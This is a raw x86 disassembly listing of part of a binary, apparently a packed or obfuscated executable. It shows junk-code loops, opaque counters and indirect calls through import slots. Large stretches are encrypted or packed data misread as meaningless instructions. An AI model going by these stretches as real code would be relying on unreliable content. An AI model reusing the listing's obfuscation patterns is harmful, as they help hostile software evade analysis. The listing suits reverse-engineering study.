  4099a2:	cmp    edi,0x50b
  4099a8:	jne    0x409556
  4099ae:	mov    eax,DWORD PTR [ebp+0xc]
  4099b1:	pop    edi
  4099b2:	xor    eax,esi
  4099b4:	pop    esi
  4099b5:	add    eax,ebx
  4099b7:	pop    ebx
  4099b8:	leave  
  4099b9:	ret    0x8
  4099bc:	push   ebp
  4099bd:	mov    ebp,esp
  4099bf:	sub    esp,0x44
  4099c2:	neg    edx
  4099c4:	push   edi
  4099c5:	mov    eax,DWORD PTR [ebp+0xc]
  4099c8:	mov    edi,DWORD PTR ds:0x433733
  4099ce:	sub    DWORD PTR ds:0x43363f,edi
  4099d4:	mov    DWORD PTR [ebp-0x10],eax
  4099d7:	and    DWORD PTR ds:0x4336ef,0x1af7
  4099e1:	mov    eax,DWORD PTR [ebp+0x8]
  4099e4:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4099eb:	and    DWORD PTR ds:0x43372f,ebx
  4099f1:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  4099f8:	or     DWORD PTR ds:0x4336b3,ebx
  4099fe:	mov    edx,DWORD PTR [ebp+0x8]
  409a01:	add    DWORD PTR ds:0x43364f,ebx
  409a07:	mov    DWORD PTR [ebp-0x40],eax
  409a0a:	mov    eax,0x7510853
  409a0f:	mov    DWORD PTR ds:0x4336e3,0x1e
  409a19:	cmp    DWORD PTR ds:0x4336e3,0x0
  409a20:	je     0x409a5e
  409a26:	cmp    DWORD PTR ds:0x4336e3,0x20
  409a2d:	jne    0x409a46
  409a33:	push   DWORD PTR [ebp-0xc]
  409a36:	push   0x43371b
  409a3b:	push   0x4dbc
  409a40:	call   DWORD PTR ds:0x412198
  409a46:	mov    edi,DWORD PTR ds:0x4336e3
  409a4c:	dec    edi
  409a4d:	mov    DWORD PTR ds:0x4336e3,edi
  409a53:	jmp    0x409a19
  409a58:	sbb    DWORD PTR ds:0x433773,ebx
  409a5e:	xor    edx,eax
  409a60:	and    DWORD PTR ds:0x4336db,0x1370
  409a6a:	mov    ecx,0x32729a
  409a6f:	xor    edi,DWORD PTR ds:0x433653
  409a75:	add    edx,ecx
  409a77:	adc    edi,0x4100
  409a7d:	mov    DWORD PTR [ebp-0x8],edx
  409a80:	mov    DWORD PTR ds:0x43363f,0x11
  409a8a:	cmp    DWORD PTR ds:0x43363f,0x0
  409a91:	je     0x409aec
  409a97:	cmp    DWORD PTR ds:0x43363f,0x6
  409a9e:	jne    0x409ab4
  409aa4:	push   0x53f1
  409aa9:	push   0x7cf0
  409aae:	call   DWORD PTR ds:0x412260
  409ab4:	cmp    DWORD PTR ds:0x43363f,0x7
  409abb:	jne    0x409ad0
  409ac1:	xor    edi,edi
  409ac3:	add    edi,DWORD PTR ds:0x43363f
  409ac9:	dec    edi
  409aca:	mov    DWORD PTR ds:0x43363f,edi
  409ad0:	mov    edi,DWORD PTR ds:0x43363f
  409ad6:	dec    edi
  409ad7:	mov    DWORD PTR ds:0x43363f,edi
  409add:	jmp    0x409a8a
  409ae2:	add    DWORD PTR ds:0x43372b,0x300c
  409aec:	mov    edx,DWORD PTR [ebp+0x8]
  409aef:	and    DWORD PTR ds:0x4336a3,0x0
  409af9:	jmp    0x409b0b
  409afe:	mov    edi,DWORD PTR ds:0x4336a3
  409b04:	inc    edi
  409b05:	mov    DWORD PTR ds:0x4336a3,edi
  409b0b:	cmp    DWORD PTR ds:0x4336a3,0x1c
  409b12:	jae    0x409b5e
  409b18:	cmp    DWORD PTR ds:0x4336a3,0x5
  409b1f:	jne    0x409b33
  409b25:	push   0x776c
  409b2a:	push   DWORD PTR [ebp-0x18]
  409b2d:	call   DWORD PTR ds:0x41219c
  409b33:	cmp    DWORD PTR ds:0x4336a3,0x4
  409b3a:	jne    0x409b4f
  409b40:	xor    edi,edi
  409b42:	xor    edi,DWORD PTR ds:0x4336a3
  409b48:	inc    edi
  409b49:	mov    DWORD PTR ds:0x4336a3,edi
  409b4f:	jmp    0x409afe
  409b54:	or     DWORD PTR ds:0x433717,0x2a5
  409b5e:	xor    edx,eax
  409b60:	or     edi,DWORD PTR ds:0x433697
  409b66:	add    edx,ecx
  409b68:	xor    edi,edi
  409b6a:	add    edi,DWORD PTR ds:0x43372f
  409b70:	or     edi,DWORD PTR ds:0x43369f
  409b76:	mov    DWORD PTR ds:0x43372f,edi
  409b7c:	mov    DWORD PTR [ebp+0xc],edx
  409b7f:	and    DWORD PTR ds:0x4336a3,0x414e
  409b89:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  409b90:	xor    edx,edx
  409b92:	xor    edx,DWORD PTR ds:0x433773
  409b98:	and    edx,DWORD PTR ds:0x433657
  409b9e:	mov    DWORD PTR ds:0x433773,edx
  409ba4:	mov    DWORD PTR [ebp-0x28],0xf89c853b
  409bab:	mov    DWORD PTR ds:0x4336af,0x15
  409bb5:	cmp    DWORD PTR ds:0x4336af,0x0
  409bbc:	je     0x409c5d
  409bc2:	cmp    DWORD PTR ds:0x4336af,0x2
  409bc9:	jne    0x409bde
  409bcf:	push   DWORD PTR [ebp-0x28]
  409bd2:	push   DWORD PTR [ebp-0x18]
  409bd5:	push   DWORD PTR [ebp-0x10]
  409bd8:	call   DWORD PTR ds:0x412264
  409bde:	cmp    DWORD PTR ds:0x4336af,0x3
  409be5:	jne    0x409bf8
  409beb:	mov    edi,DWORD PTR ds:0x4336af
  409bf1:	dec    edi
  409bf2:	mov    DWORD PTR ds:0x4336af,edi
  409bf8:	mov    edi,DWORD PTR ds:0x4336af
  409bfe:	dec    edi
  409bff:	mov    DWORD PTR ds:0x4336af,edi
  409c05:	jmp    0x409bb5
  409c0a:	and    DWORD PTR ds:0x4336a3,0x0
  409c14:	jmp    0x409c26
  409c19:	mov    edi,DWORD PTR ds:0x4336a3
  409c1f:	inc    edi
  409c20:	mov    DWORD PTR ds:0x4336a3,edi
  409c26:	cmp    DWORD PTR ds:0x4336a3,0x13
  409c2d:	jae    0x409c5d
  409c33:	cmp    DWORD PTR ds:0x4336a3,0x17
  409c3a:	jne    0x409c58
  409c40:	push   0x43385d
  409c45:	push   0x433867
  409c4a:	push   DWORD PTR [ebp-0x1c]
  409c4d:	push   0x22b4
  409c52:	call   DWORD PTR ds:0x412268
  409c58:	jmp    0x409c19
  409c5d:	mov    DWORD PTR [ebp-0x2c],0xf89c853a
  409c64:	mov    DWORD PTR [ebp-0x30],0xf89c8539
  409c6b:	jmp    0x409fde
  409c70:	push   edx
  409c71:	jle    0x409c60
  409c73:	and    al,0x7d
  409c75:	jecxz  0x409cd4
  409c77:	push   0xffffffb4
  409c79:	inc    edx
  409c7a:	push   ds
  409c7b:	imul   esp,DWORD PTR [eax],0x653d72b5
  409c81:	out    dx,al
  409c82:	jl     0x409d00
  409c84:	retf   0x7c79
  409c87:	jl     0x409c71
  409c89:	outs   dx,BYTE PTR ds:[esi]
  409c8a:	ins    DWORD PTR es:[edi],dx
  409c8b:	popf   
  409c8c:	popf   
  409c8d:	cwde   
  409c8e:	mov    esp,0xa4505d18
  409c93:	hlt    
  409c94:	outs   dx,DWORD PTR ds:[esi]
  409c95:	test   BYTE PTR fs:[ecx+0xb],0x34
  409c9a:	lods   al,BYTE PTR ds:[esi]
  409c9b:	xor    al,0xda
  409c9d:	mov    ah,0x29
  409c9f:	sub    eax,DWORD PTR [eax]
  409ca1:	mov    bl,0x40
  409ca3:	adc    DWORD PTR [ebx],esi
  409ca5:	mov    ebp,0xfbd79181
  409caa:	fcom   DWORD PTR [esi]
  409cac:	test   DWORD PTR [ecx+0x39],esi
  409caf:	jae    0x409cd5
  409cb1:	pop    esi
  409cb2:	xchg   ebx,eax
  409cb3:	outs   dx,DWORD PTR ds:[esi]
  409cb4:	add    bl,bl
  409cb6:	pop    ds
  409cb7:	inc    edi
  409cb8:	dec    ebx
  409cb9:	dec    ecx
  409cba:	adc    al,cl
  409cbc:	inc    BYTE PTR [ecx]
  409cbe:	sbb    dh,ch
  409cc0:	mov    eax,0x38fcd70e
  409cc5:	lods   eax,DWORD PTR ds:[esi]
  409cc6:	xchg   ebx,eax
  409cc7:	and    bh,ah
  409cc9:	cmp    BYTE PTR [edx-0x1],dl
  409ccc:	shl    BYTE PTR [ecx],1
  409cce:	rol    DWORD PTR [edi-0x39a5e68d],0xbb
  409cd5:	popf   
  409cd6:	xor    ecx,DWORD PTR [esi+0x7080ff6b]
  409cdc:	mov    eax,ds:0x449c6fc5
  409ce1:	mov    esp,0x112ec5e7
  409ce6:	mov    eax,0xe9b8da50
  409ceb:	jp     0x409d62
  409ced:	enter  0x2411,0x7d
  409cf1:	add    bh,BYTE PTR [edi]
  409cf3:	fild   DWORD PTR [ebx-0x3f]
  409cf6:	cwde   
  409cf7:	pop    eax
  409cf8:	or     ebx,edi
  409cfa:	or     eax,0x6bfa5e7d
  409cff:	cmp    BYTE PTR [eax+ebx*2+0x6a],0xf
  409d04:	add    BYTE PTR [esi+0x70],ah
  409d07:	dec    edx
  409d08:	std    
  409d09:	push   esp
  409d0a:	mov    ah,cl
  409d0c:	adc    al,dl
  409d0e:	jno    0x409d62
  409d10:	(bad)  
  409d11:	retf   
  409d12:	das    
  409d13:	hlt    
  409d14:	add    ebp,edi
  409d16:	mov    ebx,ecx
  409d18:	into   
  409d19:	xchg   ecx,eax
  409d1a:	ret    
  409d1b:	enter  0xe301,0x22
  409d1f:	dec    edx
  409d20:	inc    eax
  409d21:	cmp    eax,0x7659666e
  409d26:	scas   eax,DWORD PTR es:[edi]
  409d27:	fsub   DWORD PTR [eax]
  409d29:	sti    
  409d2a:	dec    esi
  409d2b:	mov    esp,0xfcf171a7
  409d30:	out    dx,al
  409d31:	or     BYTE PTR [ebx],ah
  409d33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d34:	jns    0x409d7c
  409d36:	sbb    DWORD PTR [edi-0xd3a76d1],0xd
  409d3d:	sbb    eax,ebx
  409d3f:	inc    ebx
  409d40:	push   ss
  409d41:	xchg   esp,eax
  409d42:	push   esp
  409d43:	push   edx
  409d44:	sub    al,0xa3
  409d46:	mov    bl,BYTE PTR [edi]
  409d48:	retf   
  409d49:	outs   dx,DWORD PTR ds:[esi]
  409d4a:	and    al,0xa6
  409d4c:	jae    0x409d49
  409d4e:	adc    al,0xae
  409d50:	(bad)  
  409d51:	mov    ah,0xd9
  409d53:	pop    ebp
  409d54:	enter  0xdbe4,0x9f
  409d58:	mov    ds:0xe5fdcca,eax
  409d5d:	lods   al,BYTE PTR ds:[esi]
  409d5e:	into   
  409d5f:	jecxz  0x409d23
  409d61:	push   esp
  409d62:	ret    0x38a3
  409d65:	add    BYTE PTR [ebx-0x2fc60492],ah
  409d6b:	dec    ebx
  409d6c:	inc    ebx
  409d6d:	call   0x78536231
  409d72:	aaa    
  409d73:	push   eax
  409d74:	push   edx
  409d75:	xor    al,0xab
  409d77:	test   DWORD PTR [esi+0x1dd65042],0xce5371
  409d81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d82:	and    dl,BYTE PTR ds:0xd49fd72c
  409d88:	arpl   WORD PTR [esi-0x2c],cx
  409d8b:	mov    cl,0x50
  409d8d:	mov    esp,DWORD PTR [ecx+ecx*4]
  409d90:	and    dl,BYTE PTR [eax-0x12cf990a]
  409d96:	(bad)  
  409d98:	pop    ecx
  409d99:	jmp    edx
  409d9b:	jl     0x409da2
  409d9d:	or     al,0x59
  409d9f:	xor    ah,BYTE PTR [edi+0x20a63fcc]
  409da5:	icebp  
  409da6:	retf   0x3230
  409da9:	test   BYTE PTR ds:0xdea0bf86,ah
  409daf:	add    BYTE PTR [eax],bh
  409db1:	mov    eax,ds:0x90233ece
  409db6:	jle    0x409dab
  409db8:	pop    es
  409db9:	outs   dx,BYTE PTR ds:[esi]
  409dba:	cdq    
  409dbb:	das    
  409dbc:	int3   
  409dbd:	imul   ebp,DWORD PTR [ebp-0x637c976d],0xb45baf43
  409dc7:	mov    DWORD PTR [esp+edi*8+0x14],esp
  409dcb:	stos   BYTE PTR es:[edi],al
  409dcc:	sub    DWORD PTR [edx+0x68756a10],0x69
  409dd3:	dec    edx
  409dd4:	aam    0xa
  409dd6:	mov    al,0x63
  409dd8:	or     BYTE PTR [esi-0x36],ch
  409ddb:	cmp    BYTE PTR [edx],ah
  409ddd:	mov    dl,0x8b
  409ddf:	out    0xcb,eax
  409de1:	mov    bh,dl
  409de3:	daa    
  409de4:	dec    esi
  409de5:	shl    BYTE PTR ds:0xbb63b5f4,1
  409deb:	pop    ds
  409dec:	dec    eax
  409ded:	mov    ah,0x52
  409def:	pop    edx
  409df0:	cs inc esi
  409df2:	mov    esi,0xedb4b2ef
  409df7:	leave  
  409df8:	cmc    
  409df9:	inc    edx
  409dfa:	and    eax,0x4825640d
  409dff:	push   esp
  409e00:	jle    0x409e77
  409e02:	int    0x5a
  409e04:	and    eax,0xf6f1e9c2
  409e09:	mov    bl,0x40
  409e0b:	rol    BYTE PTR [edi+0x7],1
  409e0e:	jecxz  0x409da4
  409e10:	lahf   
  409e11:	mov    al,0xb7
  409e13:	add    al,0xf9
  409e15:	push   0x50
  409e17:	stos   DWORD PTR es:[edi],eax
  409e18:	call   0x3b40:0xf067bc3c
  409e1f:	xor    eax,0xd8be54d7
  409e24:	in     eax,0xbc
  409e26:	icebp  
  409e27:	fsub   DWORD PTR [ecx]
  409e29:	xchg   ebx,eax
  409e2a:	mov    dl,0x46
  409e2c:	push   0xffffffa4
  409e2e:	pop    ss
  409e2f:	out    0xfe,al
  409e31:	xchg   ebx,eax
  409e32:	push   ds
  409e33:	leave  
  409e34:	jo     0x409e9f
  409e36:	clc    
  409e37:	or     eax,0x16be09a6
  409e3c:	pusha  
  409e3d:	cmp    BYTE PTR [edi],0xb6
  409e40:	mov    ch,0x1f
  409e42:	bound  ebx,QWORD PTR [edi+ecx*1+0xeda4755]
  409e49:	jae    0x409ec6
  409e4b:	dec    ebp
  409e4c:	rcl    BYTE PTR [edx-0x21],1
  409e4f:	mov    ah,BYTE PTR [edx+0x5cccbb45]
  409e55:	(bad)  
  409e57:	shl    BYTE PTR [edx+0x5f],0xb
  409e5b:	mov    cl,0xe7
  409e5d:	aad    0xd5
  409e5f:	cdq    
  409e60:	popa   
  409e61:	js     0x409e6c
  409e63:	cmp    eax,0xbbe17f42
  409e68:	pusha  
  409e69:	rcr    DWORD PTR [edx],0x87
  409e6c:	retf   0x1ff7
  409e6f:	(bad)  
  409e70:	out    dx,al
  409e71:	xor    DWORD PTR [ebx+0x122ccea7],ebx
  409e77:	icebp  
  409e78:	jnp    0x409eca
  409e7a:	cs xchg esp,eax
  409e7c:	xchg   DWORD PTR [ebx-0x41fbbfd],esp
  409e82:	es fwait
  409e84:	nop
  409e85:	fucom  st(6)
  409e87:	cmp    DWORD PTR [esi+edx*1-0x393efb47],edx
  409e8e:	lods   eax,DWORD PTR ds:[esi]
  409e8f:	(bad)  
  409e90:	pop    eax
  409e91:	mov    edx,0x8eee8096
  409e96:	jmp    0x4069:0xba355fd0
  409e9d:	bound  esi,QWORD PTR [ecx+0x3a]
  409ea0:	stos   DWORD PTR es:[edi],eax
  409ea1:	loopne 0x409f1f
  409ea3:	dec    edi
  409ea4:	lods   al,BYTE PTR ds:[esi]
  409ea5:	xor    BYTE PTR gs:[edx],0x59
  409ea9:	sbb    DWORD PTR [ebx-0x560417b6],ebx
  409eaf:	xor    cl,ah
  409eb1:	pop    edx
  409eb2:	loope  0x409efb
  409eb4:	je     0x409e5e
  409eb6:	cmp    BYTE PTR [esi-0x3cbe82bd],dh
  409ebc:	jbe    0x409efa
  409ebe:	test   DWORD PTR [ebp-0x62],ebx
  409ec1:	add    BYTE PTR [edi],bh
  409ec3:	adc    BYTE PTR [ebx],ch
  409ec5:	test   eax,0x647b1ed
  409eca:	dec    edx
  409ecb:	test   dh,al
  409ecd:	mov    al,ds:0x4dbbc943
  409ed2:	aaa    
  409ed3:	mov    esi,0xb3c63f4f
  409ed8:	and    al,0xa
  409eda:	mov    ch,0x8
  409edc:	add    DWORD PTR [edx-0x1d5263ef],0xffffff8d
  409ee3:	sub    ebx,DWORD PTR [edx+0xa]
  409ee6:	push   edx
  409ee7:	dec    ebx
  409ee8:	in     eax,0x11
  409eea:	stc    
  409eeb:	xchg   cl,ah
  409eed:	push   es
  409eee:	pop    edx
  409eef:	add    cl,BYTE PTR [ebp+0x720c89e1]
  409ef5:	ins    DWORD PTR es:[edi],dx
  409ef6:	dec    edx
  409ef7:	cdq    
  409ef8:	mov    ch,0xac
  409efa:	fisttp QWORD PTR ds:0xc710bdf7
  409f00:	push   ecx
  409f01:	sub    al,0x34
  409f03:	or     eax,0xa0942a62
  409f08:	jbe    0x409ee4
  409f0a:	dec    eax
  409f0b:	repz in al,dx
  409f0d:	and    DWORD PTR [ebx-0x41142988],edi
  409f13:	or     al,0x1f
  409f15:	inc    eax
  409f16:	push   ecx
  409f17:	jl     0x409ef6
  409f19:	fcomp  st(5)
  409f1b:	lock pop esp
  409f1d:	pop    edi
  409f1e:	aad    0x5d
  409f20:	leave  
  409f21:	push   esi
  409f22:	push   edi
  409f23:	out    dx,eax
  409f24:	lea    ecx,[edx]
  409f26:	popf   
  409f27:	jbe    0x409eda
  409f29:	leave  
  409f2a:	mov    bl,0x4
  409f2c:	(bad)  [ebx]
  409f2e:	fwait
  409f2f:	mov    BYTE PTR [esi+0x97c873a],bh
  409f35:	mov    esp,0x8ff1762b
  409f3a:	add    ecx,esi
  409f3c:	imul   eax,DWORD PTR [edi],0x387e950f
  409f42:	mov    esi,0x7a6f00b5
  409f47:	xchg   esp,eax
  409f48:	and    esi,edx
  409f4a:	xor    al,0x9a
  409f4c:	adc    edi,DWORD PTR [edx+0x6c57c2d8]
  409f52:	xchg   esi,eax
  409f53:	mov    BYTE PTR [esi+0x4f],ch
  409f56:	mov    ch,BYTE PTR [edi-0x62]
  409f59:	mov    ebx,0x66a9daf2
  409f5e:	mov    eax,0xdd85cfdf
  409f63:	(bad)  
  409f64:	dec    esp
  409f65:	cs inc edx
  409f67:	dec    esp
  409f68:	bound  esi,QWORD PTR [ecx-0x67]
  409f6b:	xchg   esi,eax
  409f6c:	jbe    0x409f33
  409f6e:	jg     0x409f41
  409f70:	pop    ds
  409f71:	sbb    bl,BYTE PTR [ebx+0x4ee63f03]
  409f77:	mov    dl,0xc2
  409f79:	lahf   
  409f7a:	push   ebx
  409f7b:	mov    ebx,0x31431bae
  409f80:	pop    edi
  409f81:	std    
  409f82:	xchg   ebx,eax
  409f83:	pusha  
  409f84:	daa    
  409f85:	jbe    0x409f9e
  409f87:	das    
  409f88:	mov    es,WORD PTR [edi-0x76]
  409f8b:	push   ss
  409f8c:	ss lahf 
  409f8e:	mov    esi,ebp
  409f90:	outs   dx,BYTE PTR ds:[esi]
  409f91:	mov    WORD PTR [ecx],gs
  409f93:	or     dh,bl
  409f95:	outs   dx,DWORD PTR ds:[esi]
  409f96:	mov    eax,0xdbccc9da
  409f9b:	cmc    
  409f9c:	push   edx
  409f9d:	imul   edx,DWORD PTR [ebp+0x15],0x8487b55c
  409fa4:	xchg   esi,ecx
  409fa6:	push   eax
  409fa7:	xchg   BYTE PTR [esi-0x65],bh
  409faa:	sub    BYTE PTR [ecx],0x8b
  409fad:	jg     0x409ff7
  409faf:	sub    BYTE PTR [esi+edi*8],dl
  409fb2:	test   DWORD PTR [ebx-0x6b9ed56d],ebx
  409fb8:	adc    eax,0xc1bf199
  409fbd:	pop    edx
  409fbe:	adc    al,0xcb
  409fc0:	mov    ah,0xc8
  409fc2:	cli    
  409fc3:	mov    BYTE PTR [ebp+0x330277a7],0x63
  409fca:	inc    ebp
  409fcb:	inc    eax
  409fcc:	loopne 0x409f98
  409fce:	push   0x36089a5c
  409fd3:	fcom   DWORD PTR [ebp+ebp*4-0x1170988a]
  409fda:	sub    eax,0xc769d61c
  409fdf:	inc    ebp
  409fe0:	int3   
  409fe1:	cmp    BYTE PTR [ebp+0x2581f89c],al
  409fe7:	and    esi,DWORD PTR [edi]
  409fe9:	inc    ebx
  409fea:	add    BYTE PTR [eax],al
  409fec:	add    BYTE PTR [eax],al
  409fee:	add    cl,ch
  409ff0:	or     eax,0x8b000000
  409ff5:	adc    eax,0x433723
  409ffa:	inc    edx
  409ffb:	mov    DWORD PTR ds:0x433723,edx
  40a001:	cmp    DWORD PTR ds:0x433723,0x16
  40a008:	jae    0x40a02b
  40a00e:	cmp    DWORD PTR ds:0x433723,0x18
  40a015:	jne    0x40a026
  40a01b:	push   0x35b9
  40a020:	call   DWORD PTR ds:0x41226c
  40a026:	jmp    0x409ff4
  40a02b:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a032:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a039:	movzx  edx,BYTE PTR ds:0x433773
  40a040:	adc    edx,DWORD PTR ds:0x43372b
  40a046:	mov    DWORD PTR ds:0x433773,edx
  40a04c:	mov    edx,DWORD PTR [ebp+0x8]
  40a04f:	xor    edx,eax
  40a051:	mov    edi,DWORD PTR [ebp-0x10]
  40a054:	add    edx,ecx
  40a056:	cmp    edi,edx
  40a058:	je     0x40d768
  40a05e:	mov    DWORD PTR ds:0x433657,0x2fff
  40a068:	push   ebx
  40a069:	jmp    0x40d743
  40a06e:	movzx  edi,BYTE PTR ds:0x4336df
  40a075:	xor    DWORD PTR ds:0x4336b3,edi
  40a07b:	mov    edx,DWORD PTR [ebp-0x8]
  40a07e:	mov    edi,DWORD PTR [ebp-0x10]
  40a081:	sub    DWORD PTR ds:0x433653,0x7416
  40a08b:	sub    edi,edx
  40a08d:	movzx  edx,WORD PTR ds:0x43376b
  40a094:	xor    DWORD PTR ds:0x43375b,edx
  40a09a:	jmp    0x40a40d
  40a09f:	push   edi
  40a0a0:	mov    dh,0x10
  40a0a2:	sti    
  40a0a3:	std    
  40a0a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0a5:	push   edi
  40a0a6:	jb     0x40a085
  40a0a8:	xor    dl,BYTE PTR [ecx+0x4e]
  40a0ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0ac:	sti    
  40a0ad:	add    BYTE PTR [bp+di],dh
  40a0b0:	jmp    0x7c7c:0x79ca7c7c
  40a0b7:	dec    ecx
  40a0b8:	mov    dl,0xd3
  40a0ba:	push   ebp
  40a0bb:	xor    eax,0x80bb293f
  40a0c0:	push   ebx
  40a0c1:	xor    eax,0x9b0511f7
  40a0c6:	jnp    0x40a138
  40a0c8:	jmp    0x79e7:0xcd9f1271
  40a0cf:	das    
  40a0d0:	push   0x4a
  40a0d2:	dec    esp
  40a0d3:	add    ebx,DWORD PTR [eax-0x790e179b]
  40a0d9:	sbb    al,0x7
  40a0db:	or     BYTE PTR [eax+edx*8+0x1b],0x61
  40a0e0:	int    0x99
  40a0e2:	repz cdq 
  40a0e4:	ss dec ebp
  40a0e6:	test   eax,0xa22e8091
  40a0eb:	int3   
  40a0ec:	adc    BYTE PTR [edx+0x5d0b872d],ch
  40a0f2:	pop    ss
  40a0f3:	fst    QWORD PTR [ebx+edi*1+0x3164af59]
  40a0fa:	sbb    eax,DWORD PTR [ebx+0x48]
  40a0fd:	sbb    bl,0x3a
  40a100:	neg    eax
  40a102:	sub    eax,0x30df944e
  40a107:	jmp    0x40a16a
  40a109:	loop   0x40a091
  40a10b:	lods   al,BYTE PTR fs:[esi]
  40a10d:	and    bh,BYTE PTR [esi+0x5c]
  40a110:	mov    esp,0x7ba48f9c
  40a115:	or     al,0xa4
  40a117:	xchg   ebp,eax
  40a118:	cli    
  40a119:	arpl   WORD PTR [ebx+0x4a],di
  40a11c:	out    0x4,al
  40a11e:	pop    ebp
  40a11f:	xchg   ebp,eax
  40a120:	and    DWORD PTR [esi],ebp
  40a122:	cmp    ebp,DWORD PTR [edi]
  40a124:	cmp    al,BYTE PTR [eax]
  40a126:	ins    DWORD PTR es:[edi],dx
  40a127:	xchg   ebp,eax
  40a128:	mov    ebp,0x81dbccaf
  40a12d:	mov    WORD PTR [edi+0xb],es
  40a130:	mov    edx,ds
  40a132:	js     0x40a110
  40a134:	js     0x40a0f2
  40a136:	clc    
  40a137:	(bad)  
  40a138:	jmp    0x49278134
  40a13d:	adc    DWORD PTR [esi+0x2c],edx
  40a140:	ret    
  40a141:	(bad)  
  40a142:	aad    0xe6
  40a144:	bound  esi,QWORD PTR [ecx]
  40a146:	cdq    
  40a147:	into   
  40a148:	not    BYTE PTR cs:[eax-0x79192d9]
  40a14f:	add    DWORD PTR [esi-0x3093bd6a],edx
  40a155:	or     al,0x8d
  40a157:	jne    0x40a10a
  40a159:	and    esi,DWORD PTR [edx]
  40a15b:	fist   WORD PTR [edx]
  40a15d:	pop    edi
  40a15e:	mov    bh,0x98
  40a160:	fsubrp st(4),st
  40a162:	sub    ch,dh
  40a164:	cmp    ebx,ebp
  40a166:	out    dx,al
  40a167:	(bad)  
  40a168:	push   edi
  40a169:	into   
  40a16a:	sbb    eax,DWORD PTR [edx]
  40a16c:	outs   dx,BYTE PTR ds:[esi]
  40a16d:	pop    edi
  40a16e:	rep stos BYTE PTR es:[edi],al
  40a170:	shl    DWORD PTR ds:0xd600f1c4,1
  40a176:	cmp    al,dl
  40a178:	dec    BYTE PTR [ebx]
  40a17a:	neg    bl
  40a17c:	out    dx,al
  40a17d:	ja     0x40a1eb
  40a17f:	pop    ebp
  40a180:	clc    
  40a181:	xchg   ebx,eax
  40a182:	dec    edx
  40a183:	jb     0x40a1a0
  40a185:	xor    esp,DWORD PTR [edx+ebx*1]
  40a188:	add    ebp,DWORD PTR [ebx+0x12]
  40a18b:	push   es
  40a18c:	or     esi,0xffffffe1
  40a18f:	mov    dl,0xb7
  40a191:	jns    0x40a198
  40a193:	imul   esi,DWORD PTR ds:0x74e328b6,0x32331fdd
  40a19d:	pop    eax
  40a19e:	hlt    
  40a19f:	aam    0x42
  40a1a1:	dec    edx
  40a1a2:	pop    esp
  40a1a3:	mov    ebx,0x8b78696d
  40a1a8:	lds    esi,FWORD PTR [edx+0x693ab83b]
  40a1ae:	(bad)  
  40a1af:	imul   edi,edi,0xb10dfdc6
  40a1b5:	daa    
  40a1b6:	inc    esi
  40a1b7:	inc    ebp
  40a1b8:	xchg   ebp,eax
  40a1b9:	(bad)  
  40a1ba:	mov    ecx,esp
  40a1bc:	shl    DWORD PTR [ebx-0x3087315e],0xa9
  40a1c3:	pop    edx
  40a1c4:	mov    esi,edx
  40a1c6:	push   0x13
  40a1c8:	nop
  40a1c9:	pop    eax
  40a1ca:	jnp    0x40a161
  40a1cc:	or     DWORD PTR [eax+0xf8050f4],eax
  40a1d2:	xor    eax,0x49f57c4b
  40a1d7:	aas    
  40a1d8:	je     0x40a1f6
  40a1da:	stos   DWORD PTR es:[edi],eax
  40a1db:	(bad)  
  40a1dc:	rcl    BYTE PTR [esp+ebx*2+0x6e341552],1
  40a1e3:	or     eax,ebx
  40a1e5:	das    
  40a1e6:	jne    0x40a216
  40a1e8:	dec    ebp
  40a1e9:	push   ebx
  40a1ea:	adc    BYTE PTR [edx],0x5a
  40a1ed:	jecxz  0x40a20b
  40a1ef:	test   al,0x1e
  40a1f1:	(bad)  
  40a1f3:	inc    edi
  40a1f4:	call   0x5ba3:0xd35e63a3
  40a1fb:	mov    edi,0x566cf124
  40a200:	xor    BYTE PTR [ebx-0x78bfbb95],ah
  40a206:	inc    ebp
  40a207:	cmp    ecx,ebp
  40a209:	jo     0x40a21b
  40a20b:	outs   dx,BYTE PTR ds:[esi]
  40a20c:	xor    esp,DWORD PTR [edx+0x6eb507ac]
  40a212:	push   ebx
  40a213:	mov    edx,0xd525b316
  40a218:	mov    al,0xe9
  40a21a:	shl    BYTE PTR [ebp+0x18],1
  40a21d:	ss daa 
  40a21f:	push   edx
  40a220:	outs   dx,BYTE PTR ds:[esi]
  40a221:	sub    edi,DWORD PTR [edi+esi*4-0x40]
  40a225:	ins    BYTE PTR es:[edi],dx
  40a226:	mov    ecx,0xba0543d0
  40a22b:	jp     0x40a1fc
  40a22d:	xchg   esp,eax
  40a22e:	fldenv [edi]
  40a230:	test   eax,0x8f4e7cf6
  40a235:	shr    eax,cl
  40a237:	(bad)  
  40a238:	call   0x83a47750
  40a23d:	js     0x40a1c7
  40a23f:	adc    eax,0x94ab2b6b
  40a244:	mov    ebx,0xd34cc1ab
  40a249:	inc    eax
  40a24a:	stos   BYTE PTR es:[edi],al
  40a24b:	inc    bh
  40a24d:	cmp    al,0x87
  40a24f:	mov    ch,0xc9
  40a251:	adc    eax,0xa5a89a72
  40a256:	mov    ecx,0xfc7d255b
  40a25b:	push   esp
  40a25c:	sub    DWORD PTR [edx],ebx
  40a25e:	fidiv  DWORD PTR [edi-0x71992d6c]
  40a264:	(bad)  
  40a265:	push   ecx
  40a266:	jbe    0x40a2da
  40a268:	ins    DWORD PTR es:[edi],dx
  40a269:	fdivrp st(2),st
  40a26b:	pop    ss
  40a26c:	lock and DWORD PTR [ebx-0x582163f4],edx
  40a273:	xlat   BYTE PTR ds:[ebx]
  40a274:	sbb    al,BYTE PTR [edx+0x1316be0a]
  40a27a:	mov    ah,0x3
  40a27c:	add    DWORD PTR [eax+0x641c4f8b],esi
  40a282:	js     0x40a282
  40a284:	add    ecx,DWORD PTR [edx+0x4392b3d3]
  40a28a:	mov    al,0x5
  40a28c:	(bad)  
  40a28e:	cld    
  40a28f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a290:	arpl   WORD PTR [ebx+0xf649f64],sp
  40a296:	mov    edi,0x674be457
  40a29b:	(bad)  
  40a29c:	jbe    0x40a2dd
  40a29e:	cmp    esi,DWORD PTR [eax+0x32]
  40a2a1:	cmp    ebp,DWORD PTR [eax+0x7c]
